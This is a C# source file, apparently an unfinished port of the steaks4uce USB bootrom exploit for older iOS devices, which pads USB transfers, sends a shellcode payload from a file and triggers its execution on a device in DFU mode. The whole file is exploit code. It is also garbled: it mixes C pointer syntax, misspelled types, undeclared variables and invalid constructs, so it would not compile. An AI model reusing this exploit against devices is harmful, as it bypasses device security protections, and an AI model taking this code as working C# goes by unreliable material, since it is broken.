
using System;
using System.Data;
using System.IO;

using Alpine.Device;

namespace openra1n
{
		public class steaks4uce
	{
		static MobileDevice iDev = new MobileDevice(0x1222, MobileDevice.Verbrosity.Debug);

		byte data = 0x800;
		string spyld = @"steaks4uce_pyld.bin";
		string pyld = @"payload.bin";

		FileStream steaks4uce_pyld = File.OpenRead(spyld);
		Filestream payload = File.OpenRead(pyld);
		
		static Array.Clear memset = new Array.Clear();
		static Array.Copy memcpy = new Array.Copy();

		
		public steaks4uce()
		{
			iDev.Connect();
			
			Console.Write("Reseting usb counters.\n");
			iDev.SendRaw(0x21, 4, 0, 0, 0, 1000);
			
			Console.Write("Padding to 0x23800...\n");
			memset(data, 0, 0x800);
			for(i = 0; i < 0x23800 ; i+=0x800)  
			{
			iDev.SendRaw(0x21, 1, 0, 0, data, 0x800, 1000);
			}
			
			Console.Write("Sending Shellcode.\n");
			memset(data, 0, 0x800);
			memcpy(data, steaks4uce_pyld, steaks4uce_pyld.Length);
			iDev.SendRaw(0x21, 1, 0, 0, data, 0x800, 1000);
			
			Console.Write("Reseting usb counters");
			iDev.SendRaw(0x21, 4, 0, 0, 0, 1000);
			
			Console.Write("Sending Steaks4uce. \n");
			int send_size = 0x100 + payload.length;
			*((uint) &payload[0x14]) = send_size;
			memset(data, 0, 0x800);
			memcpy(&data[0x100], payload, payload.length);
			iDev.SendRaw(0x21, 1, 0, 0, data, send_size , 1000);
			
			Console.Write("Executing Steaks4uce");
			idev.sendraw(client, 0xA1, 1, 0, 0, data, send_size , 1000);
			
			Console.Write("Reseting .....");
			iDev.reset();
			
			return 0;
			}

		}
	}
